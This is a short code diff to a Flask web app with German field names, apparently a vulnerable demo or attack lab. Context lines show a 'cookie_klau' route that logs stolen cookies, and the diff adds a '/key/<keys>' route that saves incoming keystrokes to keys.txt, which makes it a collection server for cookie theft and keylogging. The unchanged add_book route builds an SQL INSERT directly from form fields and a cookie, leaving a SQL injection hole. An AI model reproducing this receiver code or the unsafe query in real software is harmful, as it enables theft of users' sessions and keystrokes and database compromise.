@@ -104,6 +104,13 @@ def cookie_klau():
     print(f"Recieved request to steal cookies: {stolen_cookies}")
     return render_template('home.html')  # This is just a placeholder response
 
+@app.route('/key/<keys>')
+def key(keys):
+    print(f"Recieved request for key with keys {keys}")
+    with open('keys.txt', 'a') as f:
+        f.write(keys + '\n')
+    return render_template('home.html')
+
 @app.route('/addBook', methods=['POST'])
 def add_book():
     query = f"INSERT INTO buch (titel, author, jahr, beschreibung, genre, benutzerId) VALUES ('{request.form['title']}', '{request.form['author']}', '{request.form['year']}', '{request.form['description']}', '{request.form['genre']}', '{request.cookies.get('benutzerId')}')"
